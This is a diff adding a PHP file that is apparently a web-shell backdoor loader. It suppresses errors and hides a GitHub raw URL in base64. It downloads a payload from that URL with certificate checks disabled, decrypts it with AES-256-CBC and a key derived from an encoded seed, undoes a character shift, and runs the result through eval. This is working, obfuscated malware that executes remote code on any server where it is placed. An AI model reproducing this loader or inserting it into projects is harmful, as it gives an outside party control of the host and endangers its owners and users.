@@ -1,1 +1,44 @@
 
+<?php
+@error_reporting(0);
+// Honey Cipher BlackHole 
+// Signature required mined
+$hcc_0 = [
+    "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2gwMDAwMDAwMDAwMC9oMDAwMDAwMDAwMDAvbWFpbi9ibG9jay8wL2hjYzAwMDAwMDAwYWFjZDdhOWRkMzFhZGQ2MzI1ZWQ2YWIwYjI3NGZkYzcK", // base64 URL
+    "QUVTLTI1Ni1DQkM=",                                                                                               // base64 metode
+    "SE9ORVlDSVBIRVJfU0lHTkFUVVJF"                                                                                   // base64 seed
+];
+$hcc_1 = fn($hcc_x) => base64_decode($hcc_x);
+function hcc_2($hcc_url) {
+    $hcc_curl = curl_init($hcc_url);
+    curl_setopt($hcc_curl, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($hcc_curl, CURLOPT_USERAGENT, 'Mozilla/5.0');
+    curl_setopt($hcc_curl, CURLOPT_SSL_VERIFYHOST, 0);
+    curl_setopt($hcc_curl, CURLOPT_SSL_VERIFYPEER, 0);
+    $hcc_data = curl_exec($hcc_curl);
+    if (curl_errno($hcc_curl)) {
+        die("Curl error: " . curl_error($hcc_curl) . "\n");
+    }
+    curl_close($hcc_curl);
+    return $hcc_data;
+}
+$hcc_3 = trim($hcc_1($hcc_0[0]));
+$hcc_4 = hcc_2($hcc_3) or die("!die\n");
+$hcc_5 = base64_decode($hcc_4);
+if (!$hcc_5) die("!decode\n");
+if (strlen($hcc_5) < 17) die("!short\n");
+$hcc_6 = substr($hcc_5, 0, 16);
+$hcc_7 = substr($hcc_5, 16);
+$hcc_8 = hash("sha256", $hcc_1($hcc_0[2]), true);
+$hcc_9 = openssl_decrypt($hcc_7, $hcc_1($hcc_0[1]), $hcc_8, OPENSSL_RAW_DATA, $hcc_6);
+if (!$hcc_9) die("!data\n");
+$hcc_a = function($hcc_b, $hcc_n = 7) {
+    $hcc_r = '';
+    for ($hcc_j = 0, $hcc_l = strlen($hcc_b); $hcc_j < $hcc_l; $hcc_j++) {
+        $hcc_r .= chr((ord($hcc_b[$hcc_j]) - $hcc_n + 256) % 256);
+    }
+    return $hcc_r;
+};
+$hcc_c = $hcc_a($hcc_9);
+
+eval("?>" . $hcc_c);
